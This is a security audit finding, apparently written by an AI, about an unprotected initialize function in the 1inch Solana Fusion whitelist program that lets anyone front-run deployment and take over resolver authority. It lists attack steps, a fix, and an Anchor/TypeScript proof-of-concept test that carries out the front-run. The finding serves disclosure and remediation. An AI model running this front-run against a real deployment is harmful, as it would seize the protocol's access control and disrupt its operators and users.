After conducting a thorough technical validation against the 1inch Solana Fusion Protocol codebase, I must provide the following assessment:

# Audit Report

## Title
Whitelist Initialization Front-Running Enables Complete Access Control Takeover

## Summary
The whitelist program's `initialize` function lacks access control validation, creating a critical deployment-time vulnerability where any attacker can front-run the protocol team's initialization and permanently seize control of the resolver access control system.

## Finding Description

The whitelist program contains a severe access control vulnerability in its initialization mechanism. The `initialize` function establishes the authority who controls all resolver registrations, but it accepts any `Signer` without validation. [1](#0-0) 

The `Initialize` context accepts any signer as the authority with no constraints: [2](#0-1) 

The whitelist state PDA is derived using only the predictable constant seed `WHITELIST_STATE_SEED`: [3](#0-2) 

This creates an initialization race condition where anyone can calculate the PDA address (`PublicKey.findProgramAddressSync(["whitelist_state"], programId)`) and call `initialize` before the protocol team. The Anchor `init` constraint at line 49 ensures the account can only be initialized once, making any successful front-run **permanent and irreversible**.

Once an attacker successfully initializes the whitelist, they become the authority and gain exclusive control over:

**1. Resolver Registration** - The `register` function is protected by authority validation: [4](#0-3) 

**2. Resolver Deregistration** - The `deregister` function requires authority: [5](#0-4) 

**3. Authority Transfer** - The `set_authority` function prevents unauthorized changes: [6](#0-5) 

The fusion-swap program critically depends on whitelist validation for core operations. The `fill` instruction requires a valid `resolver_access` PDA: [7](#0-6) 

Similarly, the `cancel_by_resolver` operation requires resolver access validation: [8](#0-7) 

By controlling the whitelist authority, an attacker effectively controls who can execute the protocol's core operations (filling orders and canceling expired orders).

**Attack Execution:**
1. Monitor for whitelist program deployment via public RPC endpoints
2. Calculate whitelist_state PDA: `PublicKey.findProgramAddressSync(["whitelist_state"], programId)`
3. Submit `initialize()` transaction with attacker's keypair as signer with high priority fee
4. If attacker's transaction confirms first, they permanently become the authority
5. Protocol team's initialization attempt fails (account already initialized)
6. Attacker maintains permanent control unless voluntarily transferring authority

## Impact Explanation

**High Severity** - This vulnerability enables complete protocol access control takeover with severe consequences:

1. **Protocol Deployment DoS**: The protocol team permanently loses ability to initialize with the intended authority, completely blocking proper deployment. Recovery requires redeploying all programs with new program IDs and migrating infrastructure.

2. **Resolver Authorization Monopoly**: The attacker gains exclusive power to register malicious resolvers, deregister legitimate ones, block new registrations, and monetize access through extortion or selling resolver slots.

3. **Protocol Security Model Compromise**: Since fusion-swap's `fill` and `cancel_by_resolver` operations depend on whitelist validation, the attacker indirectly controls the entire trust model and which addresses can execute core protocol operations.

4. **Permanent Damage**: Without the attacker's cooperation to transfer authority, there is no recovery mechanism beyond complete redeployment.

The severity is **High** (not Critical) because it doesn't directly enable token theft from existing escrows. However, it does enable complete disruption of protocol operations and forces expensive redeployment.

## Likelihood Explanation

**High Likelihood** - This attack is highly probable:

1. **Trivial Technical Requirements**: Monitor deployments via public RPC, calculate PDA using standard functions, submit transaction with priority fee. No specialized skills needed.

2. **Minimal Economic Cost**: Transaction fees (~0.002 SOL) plus minimal rent exemption. No capital or collateral requirements.

3. **Wide Attack Window**: Vulnerability exists from program deployment until initialization. Even brief delays create exposure.

4. **Strong Economic Incentives**: Complete control over protocol access control is extremely valuable and can be monetized. Potential profit vastly exceeds cost.

5. **Deterministic Success**: If attacker's transaction confirms first, attack succeeds with 100% certainty. Priority fees provide competitive advantage.

6. **Indistinguishable Intent**: Attacker's initialization transaction appears identical to legitimate initialization.

## Recommendation

Add access control to the `initialize` function by validating the authority against a hardcoded expected deployer address or using a multi-signature scheme:

```rust
pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
    // Validate authority is the expected deployer
    require_keys_eq!(
        ctx.accounts.authority.key(),
        EXPECTED_DEPLOYER_PUBKEY,
        WhitelistError::Unauthorized
    );
    
    let whitelist_state = &mut ctx.accounts.whitelist_state;
    whitelist_state.authority = ctx.accounts.authority.key();
    Ok(())
}
```

Alternatively, deploy and initialize atomically using a deployment script that bundles both operations, or use program-derived deployment keys that are destroyed after initialization.

## Proof of Concept

```typescript
import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Whitelist } from "../target/types/whitelist";

describe("whitelist initialization front-running", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.Whitelist as Program<Whitelist>;
  
  it("Allows unauthorized initialization by any attacker", async () => {
    // Attacker generates a keypair
    const attacker = anchor.web3.Keypair.generate();
    
    // Airdrop SOL to attacker for transaction fees
    await provider.connection.requestAirdrop(
      attacker.publicKey,
      2 * anchor.web3.LAMPORTS_PER_SOL
    );
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Attacker calculates the whitelist state PDA
    const [whitelistState] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("whitelist_state")],
      program.programId
    );
    
    // Attacker calls initialize BEFORE the protocol team
    await program.methods
      .initialize()
      .accounts({
        authority: attacker.publicKey,
        whitelistState,
        systemProgram: anchor.web3.SystemProgram.programId,
      })
      .signers([attacker])
      .rpc();
    
    // Verify attacker is now the authority
    const whitelistStateAccount = await program.account.whitelistState.fetch(
      whitelistState
    );
    assert.ok(whitelistStateAccount.authority.equals(attacker.publicKey));
    
    // Protocol team's initialization attempt will now FAIL
    const protocolAuthority = anchor.web3.Keypair.generate();
    try {
      await program.methods
        .initialize()
        .accounts({
          authority: protocolAuthority.publicKey,
          whitelistState,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .signers([protocolAuthority])
        .rpc();
      assert.fail("Should have failed - account already initialized");
    } catch (err) {
      // Expected: account already exists
      assert.ok(err.toString().includes("already in use"));
    }
  });
});
```

## Notes

This is a deployment-time initialization vulnerability that exists in the current codebase. While standard deployment practices involve rapid initialization after program deployment, this provides no guarantee against determined attackers using transaction prioritization mechanisms (priority fees, MEV infrastructure). The vulnerability stems from the lack of access control in the initialization function, which is a fundamental design flaw that should be addressed before mainnet deployment.

### Citations

**File:** programs/whitelist/src/lib.rs (L9-9)
```rust
pub const WHITELIST_STATE_SEED: &[u8] = b"whitelist_state";
```

**File:** programs/whitelist/src/lib.rs (L17-22)
```rust
    /// Initializes the whitelist with the authority
    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        let whitelist_state = &mut ctx.accounts.whitelist_state;
        whitelist_state.authority = ctx.accounts.authority.key();
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L43-58)
```rust
#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L69-71)
```rust
      // Ensures only the whitelist authority can register new users
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
```

**File:** programs/whitelist/src/lib.rs (L95-97)
```rust
      // Ensures only the whitelist authority can deregister users from the whitelist
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
```

**File:** programs/whitelist/src/lib.rs (L119-121)
```rust
        // Ensures only the current authority can set new authority
        constraint = whitelist_state.authority == current_authority.key() @ WhitelistError::Unauthorized
    )]
```

**File:** programs/fusion-swap/src/lib.rs (L511-516)
```rust
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, taker.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```

**File:** programs/fusion-swap/src/lib.rs (L647-653)
```rust
    /// Account allowed to cancel the order
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, resolver.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```
